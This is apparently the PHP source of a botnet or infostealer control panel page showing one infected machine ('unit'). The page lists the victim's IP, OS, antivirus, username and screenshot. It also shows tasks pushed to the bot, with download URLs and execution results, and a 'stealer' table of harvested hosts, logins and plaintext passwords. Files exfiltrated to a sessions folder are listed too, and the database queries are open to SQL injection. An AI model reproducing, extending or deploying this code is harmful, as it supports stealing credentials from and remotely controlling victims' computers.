<?php
      
   session_start();

   if (!(isset($_SESSION['Name'])))
   {
      header("Location: Login.php");
      exit;
   }

   function GetUnitFiles($Id, $Ext)
   {
      include("Cfg/Lang.php");

      $arFileList = glob("Sessions/" . "*" . $Id . "*" . $Ext);

      if (count($arFileList) > 0)
      {
         sTable();

         $g = "<div align = center> 
                  <table cellpadding = 1 cellspacing = 1 width = \"98%\" class = table style = \"border: 1px solid;\">
                     <tr height=\"35\">                              
                        <td><div align = left>" . "&nbsp;" . "FILES:: " . "</div></td>
                        <td><div align = center>" . $lang["0167"] . ":</div></td>
                        <td><div align = center>" . $lang["0169"] . ":</div></td>
                     </tr>";

	 foreach ($arFileList as $key => $val)
	 {
            $gb = GetBG();
            $g = $g . "<tr height=\"35\">" . 
                         "<td bgcolor = " . $gb . ">" . "<div align = left>" . "&nbsp;" . "<img src=\"Images\Ico_Files.png\" width=16 height=16>" . "&nbsp;" . "<a href=" . $val . ">" . substr($val, strpos($val, "_") + 1, 255) . "</a>" . "</div></td>" .
                         "<td bgcolor = " . $gb . ">" . "<div align = center>" . filesize($val) / 1024 . " " . $lang["0168"] . "</div></td>" . 
                         "<td bgcolor = " . $gb . ">" . "<div align = center>" . date('d.m.Y H:i', filemtime($val)) . "</div></td>" . 
                      "</tr>";
         }

         $g = $g . "   </table>
               </div>";

         return $g;
      }
   }

   function GetUnitTasksCount($id)
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link, $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM tasks_exec WHERE unitid = ' . $id);
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetUnitCredCount($id)
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link, $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM stealer WHERE id = ' . $id);
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetUnitData($id, $data)
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link, $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE id = ' . $id);
      mysqli_close();

      $row = mysqli_fetch_array($result);
      return $row[$data];
   }

   function CheckUnitOrig($i)
   {
      include("Cfg/Lang.php");

      $r = GetUnitData($i, 'og');

      if ($r == "1")
      {
         return $lang["0161"];
      }
      else
      {
         return $lang["0162"];
      }
   }

   function GetUnitCred($cid)
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");

      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link, $conf['dbname']);
  
      $result_m = mysqli_query($link, 'SELECT * FROM stealer WHERE id = ' . $cid);

      if (GetUnitCredCount($cid) > 0)
      {
         sTable();

         $g = "<div align = center> 
                  <table cellpadding = 1 cellspacing = 1 width = \"98%\" class = table style = \"border: 1px solid;\">
                     <tr height=\"35\">                              
                        <td><div align = left>" . "&nbsp;" . "CREDS:: " . $lang["0054"] . ":</div></td> 
                        <td><div align = center>" . $lang["0089"] . ":</div></td>
                        <td><div align = center>" . $lang["0090"] . ":</div></td>
                        <td><div align = center>" . $lang["0091"] . ":</div></td>
                     </tr>";

         while ($r = mysqli_fetch_array($result_m))
         {      
            $host = $r['host'];
            $login = $r['login'];

            if ($_GET["full"] == "")
            {
               if (strlen($host) > 40)
               {
                  $host= substr($host, 0, 40) . "...";  
               }

               if (strlen($login) > 40)
               {
                  $login = substr($login, 0, 40) . "...";  
               }   
            }

            if ($_SESSION['Name'] != $conf["observer_login"])
            {
               $password = $r['password']; 
            }
            else
            {                     
               $password = "********";
            }

            $gb = GetBG();

            $g = $g . "<tr height=\"35\">" .
                        "<td bgcolor = " . $gb . ">" . "<div align = left>&nbsp;<img src=\"Images\\" . $r['type'] . ".png\"> " . $r['type'] . "</div></td>" .
                        "<td bgcolor = " . $gb . ">" . "<div align = left>" . $host . "</div></td>" .
                        "<td bgcolor = " . $gb . ">" . "<div align = left>" . $login . "</div></td>" .
                        "<td bgcolor = " . $gb . ">" . "<div align = left>" . $password . "</div></td>" .
            "</tr>";
         }    

         $g = $g . "   </table>
               </div>";
      }

      mysqli_close($link);
      return $g;
   }

   function GetUnitTaskResult($id, $tid)
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");

      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link, $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM results WHERE id = ' . $id);

      while ($row = mysqli_fetch_array($result))
      {      
         if($tid == $row['tid'])
         {         
            return $row['res'];
         }
      }
   }

   function GetUnitTasks($id)
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
   
      $unit = $id;

      if (GetUnitTasksCount($id) > 0)
      {

         sTable();

         $g = "<div align = center> 
                  <table cellpadding = 1 cellspacing = 1 width = \"98%\" class = table style = \"border: 1px solid;\">
                     <tr height=\"35\">                              
                        <td><div align = left>" . "&nbsp;" . "TASKS:: " . $lang["0052"] . ":</div></td> 
                        <td><div align = center>" . $lang["0053"] . ":</div></td>
                        <td><div align = center>" . $lang["0138"] . ":</div></td>
                        <td><div align = center>" . $lang["0139"] . ":</div></td>
                     </tr>";

         $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
         mysqli_select_db($link, $conf['dbname']);
      
         $result = mysqli_query($link, 'SELECT * FROM tasks_exec WHERE unitid = ' . $id);

         while ($row = mysqli_fetch_array( $result))
         {      
            $tid = $row['task_id'];
            $result_m = mysqli_query($link, 'SELECT * FROM tasks WHERE id = ' . $tid);

            while ($r = mysqli_fetch_array($result_m))
            {      
               $id = $r['id'];

               if (strpos($r['path'], ":::"))
               {
                  $url_1 = substr($r['path'], 0, strpos($r['path'], ":::"));
                  $fnc_1 = " (" . substr($r['path'], strpos($r['path'], ":::") + 3, 100) . ")";
               }  
               else
               {
                  $url_1 = $r['path'];
                  $fnc_1 = "";
               }

               if ($r['filetype'] == 0 || $r['filetype'] == 5)
               {
                  $filetype = $lang["0067"];
               }

               if ($r['filetype'] == 1 || $r['filetype'] == 6)
               { 
                  $filetype = $lang["0069"];
               }

               if ($r['filetype'] == 2 || $r['filetype'] == 7)
               {
                  $filetype = $lang["0070"];
               }

               if ($r['filetype'] == 3)
               {
                  $filetype = $lang["0068"];
               }

               if ($r['filetype'] == 4)
               {
                  $filetype = $lang["00702"];
               }

               if ($r['filetype'] == 8)
               {
                  $filetype = $lang["00710"];
               }

               if ($r['filetype'] == 9)
               {
                  $filetype = $lang["0071"];
               }

               $gb = GetBG();

               $g = $g . "<tr height=\"35\">" .
                           "<td bgcolor = " . $gb . ">" . "<div align = left>&nbsp;<img src=\"Images\Ico_Task.png\" width=16 height=16> " . $r['comment'] . "</div></td>" .
                           "<td bgcolor = " . $gb . ">" . "<div align = left>&nbsp;<img src=\"Images\Globus.png\" width=16 height=16> " . "<a href=\"" . $url_1 . "\">" . $url_1 . "</a>" .  " " . $fnc_1 . "</div>" . "</td>" .
                           "<td bgcolor = " . $gb . ">" . "<img src=\"Images\Ico_Global.png\" width=16 height=16> " . $filetype . "</td>";

               if (GetUnitTaskResult($unit, $id) == 0)
               {
                  $g = $g . "<td bgcolor = " . $gb . ">" . "<div align = center><button class='statuss'>" . $lang["0147"] . "</div></button>" . "</td>";
               }

               if (GetUnitTaskResult($unit, $id) == 1)
               {
                  $g = $g . "<td bgcolor = " . $gb . ">" . "<div align = center><button class='statuse'>" . $lang["0148"] . "</div></button>" . "</td>";
               }

               if (GetUnitTaskResult($unit, $id) == 2)
               {
                  $g = $g . "<td bgcolor = " . $gb . ">" . "<div align = center><button class='statuse'>" . $lang["0149"] . "</div></button>" . "</td>";
               }

               if (GetUnitTaskResult($unit, $id) != 0 && GetUnitTaskResult($unit, $id) != 1 && GetUnitTaskResult($unit, $id) != 2)
               {
                  $g = $g . "<td bgcolor = " . $gb . ">" . "<div align = center><button class='statusu'>" . $lang["01491"] . "</div></button>" . "</td>";
               }

               $g = $g . "</tr>";
            }
         }
      }

      $g = $g . "   </table>
            </div>";

      mysqli_close($link);   
      return $g;
   }

   include("Header.php");
   include("Functions.php");

   CheckSQL();

   $i = strfix($_GET['id']);

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $lang["0140"]  . $i . " " . $lang["0141"] .
                  "</font>
               </div>
            </td>
         </tr>
         <tr>
            <td>
               <img src=\"Images\Ang.png\" align=\"top\"></img>
            </td>
         </tr>
      </table>";

   if ((file_exists('Screens/' . $i . '.jpg')) || (file_exists('Screens\\' . $i . '.jpg')))
   {   
      echo "<div align = center> <a href=Screens\\" . $i . ".jpg> <img src=\"Screens\\" . $i . ".jpg\" width=1200 height=675> </a> </div>";    
   }

   echo "<div align = center> 
            <table cellpadding = 1 cellspacing = 1 width=\"98%\" class=table style =\"border: 1px solid;\">
               <tr height=\"35\">                      
                  <td><div align = left>&nbsp;" . $lang["0001"] . ":</div></td>
                  <td><div align = center>" . $lang["0002"] . ":</div></td>              
               </tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0142"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . $i . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0021"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData($i, 'sid') . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0160"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . CheckUnitOrig($i) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0143"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData($i, 'ip') . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0144"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData($i, 'first_ip') . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0014"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData($i, 'country') . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0026"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitData($i, 'version') . "</b></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0019"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData($i, 'os') . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0018"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData($i, 'arch') . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0017"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData($i, 'ar') . "</td></tr>";
   
   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0027"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitData($i, 'dm') . "</b></td></tr>";    

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0028"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitData($i, 'pc') . "</b></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0029"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitData($i, 'un') . "</b></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0020"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData($i, 'av') . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0145"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . date("d|m|Y H:i", (GetUnitData($i, 'reg'))) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0031"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . date("d|m|Y H:i", (GetUnitData($i, 'online'))) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0146"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitTasksCount($i) . "</b></td></tr>";

   echo GetUnitTasks($i);
   echo GetUnitCred($i);
   echo GetUnitFiles($i, "tar");
   sTable();
   include("Footer.php");
?> 